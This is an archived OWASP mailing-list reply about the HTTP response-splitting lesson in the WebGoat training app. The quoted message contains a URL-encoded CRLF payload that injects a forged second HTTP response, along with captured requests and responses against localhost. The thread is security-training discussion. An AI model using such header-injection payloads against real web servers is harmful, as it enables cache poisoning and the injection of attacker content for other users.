<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-cincinnati] WebGoat HTTP Splitting Attack Question
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-cincinnati%40lists.owasp.org?Subject=%5BOwasp-cincinnati%5D%20WebGoat%20HTTP%20Splitting%20Attack%20Question&In-Reply-To=DA235E4D5FD3CE4C8B77382F0837274C48C37A%40EXCHMAIL01.corp.medplus.com">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="000091.html">
   <LINK REL="Next"  HREF="000094.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-cincinnati] WebGoat HTTP Splitting Attack Question</H1>
    <B>Marco Morana</B> 
    <A HREF="mailto:owasp-cincinnati%40lists.owasp.org?Subject=%5BOwasp-cincinnati%5D%20WebGoat%20HTTP%20Splitting%20Attack%20Question&In-Reply-To=DA235E4D5FD3CE4C8B77382F0837274C48C37A%40EXCHMAIL01.corp.medplus.com"
       TITLE="[Owasp-cincinnati] WebGoat HTTP Splitting Attack Question">marco.m.morana at gmail.com
       </A><BR>
    <I>Fri Jul 18 13:36:51 EDT 2008</I>
    <P><UL>
        <LI>Previous message: <A HREF="000091.html">[Owasp-cincinnati] WebGoat HTTP Splitting Attack Question
</A></li>
        <LI>Next message: <A HREF="000094.html">[Owasp-cincinnati] WebGoat HTTP Splitting Attack Question
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#92">[ date ]</a>
              <a href="thread.html#92">[ thread ]</a>
              <a href="subject.html#92">[ subject ]</a>
              <a href="author.html#92">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>Yan

I am not familiar with this lesson but I would think to split the
response you would need to inject the CRLF sequence

Did you try that?

I added further resources to conduct the attack herein (*) hope it helps

Regards

Marco

(*)
<A HREF="http://www.webappsec.org/projects/threat/classes/http_response_splitting.shtml">http://www.webappsec.org/projects/threat/classes/http_response_splitting.shtml</A>
<A HREF="http://www.packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf">http://www.packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf</A>
<A HREF="http://www.owasp.org/index.php/HTTP_Response_Splitting">http://www.owasp.org/index.php/HTTP_Response_Splitting</A>


On Fri, Jul 18, 2008 at 9:46 AM, Zhou, Yan &lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-cincinnati">yzhou at medplus.com</A>&gt; wrote:
&gt;<i> HI there,
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Although I successfully completed HTTP Splitting Attack in WebGoat 5.2, I
</I>&gt;<i> did not understand a step-by-step behavior of the attack.  I am using
</I>&gt;<i> WebScarab to capture all request &amp; response to give me a better idea.
</I>&gt;<i>
</I>&gt;<i> For example, what does the browser do with the 2nd &quot;made-up&quot; response? Here
</I>&gt;<i> is what I did for testing.
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> First, I put in the query parameter exactly as is given in the hint:
</I>&gt;<i>
</I>&gt;<i> language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-
</I>&gt;<i> &#8230;&#8230;&#8230;
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> This is the response I got from server below:
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> HTTP/1.1 302 Moved Temporarily
</I>&gt;<i>
</I>&gt;<i> Server: Apache-Coyote/1.1
</I>&gt;<i>
</I>&gt;<i> Location:
</I>&gt;<i> <A HREF="http://localhost/WebGoat/attack?Screen=2&amp;menu=100&amp;fromRedirect=yes&amp;language=language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Wed,%2016%20Jul%202018%2012:55:46%20GMT%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html">http://localhost/WebGoat/attack?Screen=2&amp;menu=100&amp;fromRedirect=yes&amp;language=language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Wed,%2016%20Jul%202018%2012:55:46%20GMT%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html</A>&gt;Insert
</I>&gt;<i> undesireable content here&lt;/html&gt;
</I>&gt;<i>
</I>&gt;<i> Content-Type: text/html;charset=ISO-8859-1
</I>&gt;<i>
</I>&gt;<i> Content-length: 0
</I>&gt;<i>
</I>&gt;<i> Date: Wed, 16 Jul 2008 13:47:47 GMT
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Notice that the response does not appear to be split, the 2nd injected
</I>&gt;<i> response is still part of the query parameter as shown in &quot;location&quot; header.
</I>&gt;<i> Is this a display issue or am I missing something?
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> The browser then generates the next GET request, everything I injected is
</I>&gt;<i> now part of GET parameter (if the response is split, I would not see the
</I>&gt;<i> injected content being part of the query parameter, right?)
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> GET
</I>&gt;<i> <A HREF="http://localhost:80/WebGoat/attack?Screen=2&amp;menu=100&amp;fromRedirect=yes&amp;language=language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%2...........">http://localhost:80/WebGoat/attack?Screen=2&amp;menu=100&amp;fromRedirect=yes&amp;language=language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%2...........</A>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Then, the response from server, the server should respond with the above GET
</I>&gt;<i> request, right? But here is what I see, notice that is DIFFERENT from what I
</I>&gt;<i> injected because of the additional headers.
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> HTTP/1.1 200 OK
</I>&gt;<i>
</I>&gt;<i> Server: Apache-Coyote/1.1
</I>&gt;<i>
</I>&gt;<i> Pragma: No-cache
</I>&gt;<i>
</I>&gt;<i> Cache-Control: no-cache
</I>&gt;<i>
</I>&gt;<i> Expires: Wed, 31 Dec 1969 19:00:00 EST
</I>&gt;<i>
</I>&gt;<i> Content-Type: text/html
</I>&gt;<i>
</I>&gt;<i> X-Transfer-Encoding: chunked
</I>&gt;<i>
</I>&gt;<i> Date: Fri, 18 Jul 2008 13:28:52 GMT
</I>&gt;<i>
</I>&gt;<i> Content-length: 45
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> &lt;html&gt;Insert undesireable content here&lt;/html&gt;
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> My questions are:
</I>&gt;<i>
</I>&gt;<i> 1. I would hope to see two responses being split in the middle like this. I
</I>&gt;<i> do not know if this is just a matter of displaying (since the attack was
</I>&gt;<i> successful)
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>         HTTP/1.1 200 OK
</I>&gt;<i>
</I>&gt;<i>         ...
</I>&gt;<i>
</I>&gt;<i>         Set-Cookie: author=Wiley Hacker
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>         HTTP/1.1 200 OK
</I>&gt;<i>
</I>&gt;<i>         ...
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> 2. why is not there a response to the 2nd GET request, but a similar
</I>&gt;<i> response to my injected text?
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Thanks,
</I>&gt;<i>
</I>&gt;<i> Yan Zhou
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Confidentiality Notice: The information contained in this electronic
</I>&gt;<i> transmission is confidential and may be legally privileged. It is intended
</I>&gt;<i> only for the addressee(s) named above. If you are not an intended recipient,
</I>&gt;<i> be aware that any disclosure, copying, distribution or use of the
</I>&gt;<i> information contained in this transmission is prohibited and may be
</I>&gt;<i> unlawful. If you have received this transmission in error, please notify us
</I>&gt;<i> by telephone (513) 229-5500 or by email (<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-cincinnati">postmaster at MedPlus.com</A>). After
</I>&gt;<i> replying, please erase it from your computer system.
</I>&gt;<i>
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Owasp-cincinnati mailing list
</I>&gt;<i> <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-cincinnati">Owasp-cincinnati at lists.owasp.org</A>
</I>&gt;<i> <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-cincinnati">https://lists.owasp.org/mailman/listinfo/owasp-cincinnati</A>
</I>&gt;<i>
</I>&gt;<i>
</I></PRE>



<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="000091.html">[Owasp-cincinnati] WebGoat HTTP Splitting Attack Question
</A></li>
	<LI>Next message: <A HREF="000094.html">[Owasp-cincinnati] WebGoat HTTP Splitting Attack Question
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#92">[ date ]</a>
              <a href="thread.html#92">[ thread ]</a>
              <a href="subject.html#92">[ subject ]</a>
              <a href="author.html#92">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-cincinnati">More information about the Owasp-cincinnati
mailing list</a><br>
</body></html>
